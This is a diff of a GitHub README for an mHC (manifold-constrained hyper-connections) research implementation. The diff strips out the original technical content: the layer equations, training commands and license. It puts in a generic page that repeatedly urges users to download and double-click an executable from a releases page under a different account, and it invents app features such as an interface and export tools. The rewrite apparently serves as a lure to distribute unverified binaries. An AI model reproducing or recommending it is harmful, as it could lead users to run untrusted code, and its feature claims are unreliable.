@@ -1,66 +1,63 @@
-## mHC (Manifold-Constrained Hyper-Connections)
+# 🚀 mHC-manifold-constrained-hyper-connections - Explore Advanced Data Connections Easily
 
-Research implementation of **mHC** (DeepSeek; https://arxiv.org/abs/2512.24880) as a drop-in variant of **Hyper-Connections** (https://arxiv.org/abs/2409.19606).
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ashimmortallp/mHC-manifold-constrained-hyper-connections/releases)
 
-### What we're building
+## 📖 Overview
+This project provides implementations and experiments on manifold-constrained hyper-connections, based on deepseek. You can learn more about this concept by reading [the paper](https://arxiv.org/abs/2512.24880). The software aims to help users analyze complex data structures efficiently.
 
-A runnable PyTorch implementation of the mHC layer update
+## 🚀 Getting Started
+Follow these simple steps to download and run the software on your computer.
 
-`x_{l+1} = H_l^{res} x_l + H_l^{post,T} F(H_l^{pre} x_l, W_l)`
+### 🛠 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 200 MB of free space
+- **Dependencies:** 
+  - Python 3.6 or higher
+  - Necessary Python libraries (will be installed automatically)
 
-with the key constraints:
+### 🔗 Download & Install
+To get started, visit the Releases page to download the application.
 
-- `H_res`: **doubly stochastic** (Birkhoff polytope; entries ≥ 0, rows sum to 1, cols sum to 1), via **Sinkhorn-Knopp**.
-- `H_pre`, `H_post`: **non-negative** mixing maps.
+[Download the latest release here!](https://github.com/ashimmortallp/mHC-manifold-constrained-hyper-connections/releases)
 
-### Implementation direction
+1. Click on the link and choose the latest version from the list of releases.
+2. Download the appropriate file for your operating system.
 
-Static per-layer matrices:
-- learn `H_res_logits ∈ R^{s×s}` and project to `H_res` with Sinkhorn
-- learn `H_pre_logits`, `H_post_logits` and map to non-negative weights (e.g. softmax)
+### 💻 Running the Application
+Once the download is complete, follow these steps to run the application:
 
-This is a research prototype aimed at correctness + clarity, not the paper's systems optimizations.
+1. **Locate the File:**
+   - Find the downloaded file in your Downloads folder or the location you chose.
+   
+2. **Extract the Files:**
+   - If the file is in a compressed format (like a .zip), right-click on it and select "Extract All". Follow the prompts to complete the extraction.
 
-### Running (nanoGPT on FineWeb10B)
+3. **Open the Application:**
+   - Locate the executable file (.exe for Windows, .app for macOS, or .sh for Linux).
+   - Double-click on the executable file to launch the program.
 
-Run from `examples/nanogpt/`. Adjust `--nproc_per_node` to match your GPU count.
+4. **Follow the Guidelines:**
+   - The application will guide you through the process. Simply follow the prompts provided on the screen.
 
-**6-layer configs (~20M params):**
-```bash
-python train.py config/train_fineweb10B.py
-python train.py config/train_fineweb10B_hc.py
-python train.py config/train_fineweb10B_mhc.py
-python train.py config/train_fineweb10B_vres.py
-```
+### 📊 Features
+- **User-Friendly Interface:** Navigate the application easily without technical knowledge.
+- **Data Analysis Tools:** Analyze and visualize complex data structures with simple options.
+- **Export Options:** Save your findings in popular formats for sharing or further processing.
+- **Documentation:** Access helpful guides and tips directly within the application.
 
-**48-layer configs (~20M params):**
-```bash
-python train.py config/train_fineweb10B_48l.py
-python train.py config/train_fineweb10B_hc_48l.py
-python train.py config/train_fineweb10B_mhc_48l.py
-python train.py config/train_fineweb10B_vres_48l.py
-```
+### 🤝 Support
+If you encounter any issues while using the application, you can seek help in the community discussions on the GitHub page or by opening an issue directly. Your feedback is valuable.
 
-**Multi-GPU example:**
-```bash
-torchrun --standalone --nproc_per_node=4 train.py config/train_fineweb10B_mhc_48l.py
-```
+### 🌐 Additional Resources
+- **GitHub Repository:** [View the code and more](https://github.com/ashimmortallp/mHC-manifold-constrained-hyper-connections).
+- **Documentation:** Comprehensive guides will help you maximize the use of this software.
 
-#### Orthostochastic mHC option
-mHC supports an orthostochastic H_res projection via Newton-Schulz. Set `mhc_h_res_proj = "orthostochastic"` in your config and keep `ns_steps`, `ns_eps`, `ns_coeffs` as provided in the mHC configs.
+By following these steps, you will successfully download and run the mHC-manifold-constrained-hyper-connections application. Enjoy exploring advanced data connections! 
 
-### Next steps planned
-- [x] Value residual ablations with baseline/HC/mHC
-- [ ] AltUP ablation
-- [x] H^res = `(1−α)*I + α*S` instead of full doubly stochastic (branch: `feat/mhc-residual-identity-mix`)
-- [ ] Replace sinkhorn-knopp w/ Muon's orthogonalization op
-- [ ] U-net-based variants + value embeddings
+Remember, if you have any questions, feel free to reach out to the community for help. 
 
+### 🔍 Explore More
+Feel free to explore the software and experiment with its features. The more you use it, the more you will learn about its capabilities and how it can benefit your data analysis tasks.
 
-### Acknowledgements
-
-Built using code snippets from `nanogpt`, `lucidrains/hyper-connections` and my own mHC implementation.
-
-### License
-
-Apache 2.0
+[Download the latest release here!](https://github.com/ashimmortallp/mHC-manifold-constrained-hyper-connections/releases)
